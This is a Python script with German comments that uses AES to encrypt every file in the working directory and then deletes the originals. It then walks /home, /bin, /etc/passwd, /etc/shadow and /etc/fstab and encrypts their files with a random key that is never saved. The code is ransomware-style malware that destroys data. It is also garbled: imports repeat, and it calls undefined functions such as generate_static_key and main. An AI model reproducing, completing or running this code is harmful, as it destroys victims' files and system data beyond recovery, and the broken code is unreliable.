from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import os
import socket
import requests
import os
import shutil
import hashlib
from Crypto.Cipher import AES

def encrypt_and_delete_files(static_key):
    current_directory = os.getcwd()

    for filename in os.listdir(current_directory):
        file_path = os.path.join(current_directory, filename)
        if os.path.isfile(file_path):
            with open(file_path, 'rb') as f:
                plain_text = f.read()

            cipher = AES.new(static_key, AES.MODE_CBC)
            cipher_text = cipher.iv + cipher.encrypt(pad(plain_text, AES.block_size))

            encrypted_file_path = os.path.join(current_directory, 'encrypted_' + filename)
            with open(encrypted_file_path, 'wb') as f:
                f.write(cipher_text)

            # Optional: Speichere den Schlüssel und den IV sicher für die spätere Entschlüsselung
            # save_key_and_iv(encrypted_file_path + '.key', static_key, cipher.iv)

            # Lösche die Originaldatei
            os.remove(file_path)

# Beispiel für die Verwendung der Funktion
static_key = generate_static_key()
encrypt_and_delete_files(static_key)

if __name__ == "__main__":
    main()
class FileEncryptor:
    def __init__(self, key):
        self.key = hashlib.sha256(key).digest()

    def encrypt_file(self, input_file, output_file):
        chunk_size = 64 * 1024
        iv = os.urandom(16)

        encryptor = AES.new(self.key, AES.MODE_CBC, iv)

        with open(input_file, 'rb') as infile:
            with open(output_file, 'wb') as outfile:
                outfile.write(iv)
                while True:
                    chunk = infile.read(chunk_size)
                    if len(chunk) == 0:
                        break
                    elif len(chunk) % 16 != 0:
                        chunk += b' ' * (16 - len(chunk) % 16)
                    outfile.write(encryptor.encrypt(chunk))

        print(f'Successfully encrypted: {input_file}')

def encrypt_all_files(base_paths, key):
    encryptor = FileEncryptor(key)

    for base_path in base_paths:
        for root, dirs, files in os.walk(base_path):
            for file in files:
                input_file = os.path.join(root, file)
                output_file = os.path.join(root, 'encrypted_' + file)

                encryptor.encrypt_file(input_file, output_file)

# Pfade, die durchsucht werden sollen
base_paths = [
    "/etc/passwd",
    "/home",
    "/etc/shadow",
    "/etc/fstab",
    "/bin",
]

# Generiere einen zufälligen Schlüssel für die AES-Verschlüsselung
key = os.urandom(32)  # Verwende einen 256-Bit-Schlüssel

# Verschlüssele alle Dateien in den angegebenen Pfaden
encrypt_all_files(base_paths, key)




